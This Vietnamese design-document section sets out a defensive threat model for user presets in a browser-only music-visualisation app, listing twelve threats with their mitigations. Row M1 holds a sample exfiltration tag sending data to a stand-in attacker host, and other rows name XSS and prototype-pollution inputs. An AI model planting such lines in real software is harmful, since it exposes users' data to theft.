---
doc: EXPRESSIONS.md
doc_title: "Biểu thức người dùng, mô hình bảo mật và kiểm duyệt cộng đồng"
section: "2. \"Mã độc\" ở đây là gì"
path: "2. \"Mã độc\" ở đây là gì"
chunk: 2-ma-doc-o-day-la-gi.md
source_lines: 11-31
source_sha1: 19ec9a9aa3
ids: [AD-12, NFR-SEC-02, OI-17, REQ-PARSER-00]
---
## 2. "Mã độc" ở đây là gì

Ứng dụng chạy hoàn toàn trong trình duyệt (không backend). Trình duyệt đã cô lập trang web khỏi hệ điều hành, nên một preset độc **không thể** cài virus hay đọc ổ cứng một cách trực tiếp. Nhưng nếu preset chạy được JavaScript tuỳ ý trong trang, nó vẫn gây hại được theo những cách sau:

| # | Mối đe doạ | Ví dụ cụ thể | Chặn bằng |
|---|---|---|---|
| M1 | **Đánh cắp dữ liệu** | Đọc dự án nhạc, tài nguyên, preset riêng trong IndexedDB/localStorage rồi gửi ra ngoài qua `fetch`, `<img src="https://kẻ-xấu/?d=…">`, CSS `url()`, WebSocket | Biểu thức không truy cập được gì (§3); CSP `connect-src 'self'`, `img-src` không cho máy chủ ngoài (§5) |
| M2 | **Theo dõi** | Preset tham chiếu ảnh hoặc phông trên máy chủ ngoài, lộ IP và thời điểm mở | Preset không được chứa URL ngoài; tài nguyên nhúng theo băm (AD-12) |
| M3 | **Treo hoặc làm sập tab** | Vòng lặp vô hạn, đệ quy, cấp phát hàng GB, regex thảm hoạ | Ngôn ngữ không có vòng lặp, đệ quy, regex; ngân sách bước tính; chạy trong Worker có watchdog (§4, §5) |
| M4 | **Đào tiền ảo** | Dùng CPU/GPU của người xem để đào coin | Không chạy được mã tuỳ ý; ngân sách tính toán mỗi khung |
| M5 | **Lừa đảo giao diện** | Vẽ hộp thoại giả "đăng nhập GitHub" để lấy mật khẩu; liên kết lừa | Preset chỉ vẽ vào canvas khung hình, không tạo được DOM, form, liên kết; CSP `form-action 'none'` |
| M6 | **XSS qua dữ liệu** | Tên preset, mô tả, tên tác giả chứa `<script>` hoặc HTML | React escape mặc định; cấm `dangerouslySetInnerHTML`/`innerHTML` (NFR-SEC-02); Trusted Types |
| M7 | **SVG chứa script** | Tài nguyên `.svg` có `<script>`, `onload`, `<foreignObject>` | SVG chỉ vẽ qua `<img>`/`ImageBitmap` (script không chạy); CI cộng đồng từ chối SVG có các thẻ này |
| M8 | **Bom giải nén / bom ảnh** | Gói preset 10 KB bung ra 10 GB; PNG 1×1 khai báo 100.000×100.000 điểm ảnh | Giới hạn giải nén của parser-core (REQ-PARSER-00); kiểm kích thước ảnh trước khi giải mã |
| M9 | **Prototype pollution** | JSON có khoá `__proto__`, `constructor` làm hỏng đối tượng của ứng dụng | Kiểm schema, bỏ khoá cấm (đã làm cho schema nhị phân); dùng `Object.create(null)` hoặc `Map` |
| M10 | **Dùng chung origin trên GitHub Pages** | Trang `tên.github.io/repo-khác` cùng origin với `tên.github.io/dawviz`, nên **đọc được localStorage/IndexedDB** của ứng dụng | Host ở tên miền riêng hoặc tài khoản/tổ chức GitHub chỉ dùng cho dự án (OI-17, §5) |
| M11 | **Chuỗi cung ứng** | Gói npm bị chiếm quyền chèn mã vào bản build; PR sửa workflow để đánh cắp token | `npm ci` theo lockfile, ít phụ thuộc, Dependabot, ghim GitHub Actions theo SHA, quyền token tối thiểu, CODEOWNERS (§6) |
| M12 | **Tải tệp độc về máy** | Preset tự kích hoạt tải xuống một tệp `.exe` | Preset không có khả năng tải xuống; chỉ người dùng bấm "Xuất" mới tạo tệp, và chỉ là video hoặc preset |

**Kết luận:** chỉ cần **không bao giờ chạy mã của preset như JavaScript** (§3, §4) là đã chặn tận gốc M1, M3, M4, M5, M12. Các lớp còn lại (§5) phòng khi có lỗi ở đâu đó.
